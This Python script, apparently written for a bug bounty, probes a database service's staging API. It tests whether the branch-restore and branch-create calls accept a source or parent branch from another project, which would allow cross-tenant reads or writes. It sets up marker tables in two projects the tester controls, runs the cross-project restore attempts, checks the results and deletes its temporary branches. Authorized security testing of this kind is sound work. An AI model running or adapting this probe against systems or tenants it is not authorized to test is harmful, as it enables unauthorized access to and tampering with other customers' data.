# -*- coding: utf-8 -*-
"""W3c: branch-restore source_branch_id cross-project reference (console-stage).
Endpoint: POST /projects/{pid}/branches/{target}/restore
body: {"source_branch_id": <branch>}   (mechanism != snapshot-restore of S2)

If control plane validates the PATH project but trusts a foreign source_branch_id,
an attacker who owns project A could rewrite project B's branch content
(cross-tenant write) or leak foreign data into own branch (read primitive).
Markers: A3 has mkA, B2 has mkB, A2 empty.
  T1 same-project control : restore A2 <- A3  (expect mkA)
  T2 cross-project attempt : restore A2 <- B2 (mkB visible in A2 == leak/write)
  T3 cross-project attempt : restore B2 <- A3 (mkA visible in B2 == write)
  T4 schema-only parent cross-project (PA create, parent_id = PB main) - cheap
Cleanup all temp branches. Self data only; X-Bug-Bounty: xxbo.
"""
import json
import ssl
import time
import uuid
import http.client
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo", "Content-Type": "application/json"}
PA = "orange-sun-90493739"
PB = "damp-term-63384673"
PAMAIN = "br-wandering-field-w2ob6mpn"
PBMAIN = "br-raspy-band-w247957z"
TAG = "w3c" + uuid.uuid4().hex[:4]
LOG = r"F:\scan\neon_report\_w3c_out.txt"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]


def out(s):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), s)
    print(line, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(line + "\n")


def call(method, path, body=None, timeout=45, tries=3):
    last = (None, "")
    for _ in range(tries):
        try:
            ctx = ssl.create_default_context()
            conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
            payload = json.dumps(body) if body is not None else None
            conn.request(method, API_BASE + path, body=payload,
                         headers=dict(HB, Authorization="Bearer " + APIKEY))
            resp = conn.getresponse()
            data = resp.read().decode("utf-8", "replace")
            conn.close()
            return resp.status, data
        except Exception as e:
            last = (None, str(e)[:120])
            time.sleep(2)
    return last


def jget(raw, *keys):
    try:
        d = json.loads(raw)
        for k in keys:
            d = d[k]
        return d
    except Exception:
        return None


def wait_branch(pid, bid, want="ready", tries=40, gap=3):
    for _ in range(tries):
        st, raw = call("GET", "/projects/%s/branches/%s" % (pid, bid))
        if st == 200:
            b = jget(raw, "branch") or {}
            if b.get("pending_state") == want or (
                    b.get("current_state") == want and b.get("pending_state") is None):
                return True, b
        time.sleep(gap)
    return False, {}


def ensure_endpoint(pid, bid):
    st, raw = call("GET", "/projects/%s/branches/%s/endpoints" % (pid, bid))
    eps = jget(raw, "endpoints") if st == 200 else None
    if isinstance(eps, list) and eps and eps[0].get("host"):
        return eps[0]["host"], "existing"
    st, raw = call("POST", "/projects/%s/endpoints" % pid,
                   {"endpoint": {"branch_id": bid, "type": "read_write"}})
    for _ in range(40):
        time.sleep(3)
        st, raw = call("GET", "/projects/%s/branches/%s/endpoints" % (pid, bid))
        eps = jget(raw, "endpoints") if st == 200 else None
        if isinstance(eps, list) and eps and eps[0].get("host"):
            return eps[0]["host"], "created"
    return None, "no-endpoint"


def branch_uri(pid, bid):
    st, raw = call("GET", "/projects/%s/connection_uri?database_name=neondb"
                          "&role_name=neondb_owner&branch_id=%s" % (pid, bid))
    uri = jget(raw, "uri")
    if not uri:
        return None
    parts = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def db_q(uri, sql, retries=8):
    import psycopg
    last = None
    for _ in range(retries):
        try:
            with psycopg.connect(uri, connect_timeout=20) as conn:
                conn.autocommit = True
                with conn.cursor() as cur:
                    cur.execute(sql)
                    if cur.description:
                        return ("OK", cur.fetchall())
                    return ("OK", None)
        except Exception as e:
            last = e
            time.sleep(5)
    return ("ERR", str(last)[:220])


def create_branch(pid, pid_main, name):
    st, raw = call("POST", "/projects/%s/branches" % pid,
                   {"branch": {"name": name, "parent_id": pid_main}})
    bid = jget(raw, "branch", "id")
    out("S  create %s/%s -> %s %s" % (pid, name, st, bid or raw[:220]))
    if bid:
        wait_branch(pid, bid)
        ensure_endpoint(pid, bid)
    return bid


def mk(pid, bid, table, val):
    uri = branch_uri(pid, bid)
    r = db_q(uri, "CREATE TABLE IF NOT EXISTS public.%s (v text)" % table)
    r = db_q(uri, "DELETE FROM public.%s" % table)
    r = db_q(uri, "INSERT INTO public.%s VALUES ('%s')" % (table, val))
    return r[0], uri


def probe(pid, bid, table):
    uri = branch_uri(pid, bid)
    r = db_q(uri, "SELECT * FROM public.%s" % table)
    return r


def main():
    out("== W3c restore source cross-project  tag=%s ==" % TAG)
    created = []
    try:
        # ---- setup: A2 target (PA), A3 same-proj source, B2 cross-proj source ----
        a2 = create_branch(PA, PAMAIN, "w3ca2-%s" % TAG)
        a3 = create_branch(PA, PAMAIN, "w3ca3-%s" % TAG)
        b2 = create_branch(PB, PBMAIN, "w3cb2-%s" % TAG)
        created = [("A2", PA, a2), ("A3", PA, a3), ("B2", PB, b2)]
        if not all(x[2] for x in created):
            out("SETUP FAILED")
            return
        r = mk(PA, a3, "xmark", "mkA-%s" % TAG)
        out("A3 mkA: %s" % (r[0],))
        r = mk(PB, b2, "xmark", "mkB-%s" % TAG)
        out("B2 mkB: %s" % (r[0],))
        r = probe(PA, a2, "xmark")
        out("A2 baseline: %s %s" % (r[0], r[1]))

        # ---- T1 same-project control ----
        st, raw = call("POST", "/projects/%s/branches/%s/restore" % (PA, a2),
                       {"source_branch_id": a3})
        out("T1 restore A2<-A3: %s %s" % (st, raw[:260]))
        wait_branch(PA, a2, want="ready", tries=40, gap=3)
        r = probe(PA, a2, "xmark")
        out("T1 A2 content: %s %s" % (r[0], r[1]))

        # ---- T2 cross-project: A2 <- B2 (foreign source) ----
        st, raw = call("POST", "/projects/%s/branches/%s/restore" % (PA, a2),
                       {"source_branch_id": b2})
        out("T2 restore A2<-B2(cross): %s %s" % (st, raw[:260]))
        time.sleep(5)
        r = probe(PA, a2, "xmark")
        out("T2 A2 content: %s %s" % (r[0], r[1]))

        # ---- T3 cross-project write: B2 <- A3 ----
        st, raw = call("POST", "/projects/%s/branches/%s/restore" % (PB, b2),
                       {"source_branch_id": a3})
        out("T3 restore B2<-A3(cross): %s %s" % (st, raw[:260]))
        time.sleep(5)
        r = probe(PB, b2, "xmark")
        out("T3 B2 content: %s %s" % (r[0], r[1]))

        # ---- T4 schema-only cross-project parent ----
        st, raw = call("POST", "/projects/%s/branches" % PA,
                       {"branch": {"name": "w3cx-%s" % TAG, "parent_id": PBMAIN,
                                   "init_source": "schema-only"}})
        out("T4 so cross-parent(PA,parent=PBmain): %s %s" % (st, raw[:260]))
        if st in (200, 201):
            bx = jget(raw, "branch", "id")
            if bx:
                created.append(("X", PA, bx))
    finally:
        out("cleanup %d" % len(created))
        for name, pid, bid in reversed(created):
            st, raw = call("DELETE", "/projects/%s/branches/%s" % (pid, bid))
            out("del %s %s -> %s" % (name, bid, st))
            time.sleep(1)
        out("== W3c DONE")


if __name__ == "__main__":
    main()
